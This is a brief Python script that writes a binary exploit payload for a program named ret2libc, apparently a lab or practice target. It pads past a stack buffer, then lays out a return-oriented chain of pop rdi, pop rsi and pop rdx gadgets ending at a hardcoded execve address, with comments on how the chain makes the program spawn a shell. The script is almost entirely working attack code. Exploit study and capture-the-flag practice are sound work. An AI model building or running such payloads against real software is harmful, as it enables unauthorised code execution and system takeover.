import sys

execve_addr = 0x7ffff7e98a10 # p execve (GDB)

# ropper --file ./ret2libc --search "pop r??; ret;"
# 0x000000000040115a: pop rdi; ret;
# 0x000000000040115c: pop rsi; ret;
# 0x000000000040115e: pop rdx; ret; 


# Now, if we choose to overwrite the saved instruction pointer, first with the address of our first gadget, then with our first parameter, then with our second
# gadget, then with our second parameter, then with our third and final gadget, then with our third and final parameter, then finally with the address of execve,
# we will get the desired result. (ROP CHAINS)

sys.stdout.buffer.write(b"/"*144 + 
                        b"/opt/sh\0" + 
                        b"\x00\x00\x00\x00\x00\x40\x11\x5a"[::-1] +
                        b"\x00\x00\x7f\xff\xff\xff\xe0\xa0"[::-1] +
                        b"\x00\x00\x00\x00\x00\x40\x11\x5c"[::-1] +
                        b"\x00"*8 +
                        b"\x00\x00\x00\x00\x00\x40\x11\x5e"[::-1] +
                        b"\x00"*8 +
                        b"\x00\x00\x7f\xff\xf7\xe9\x8a\x10"[::-1]
                        )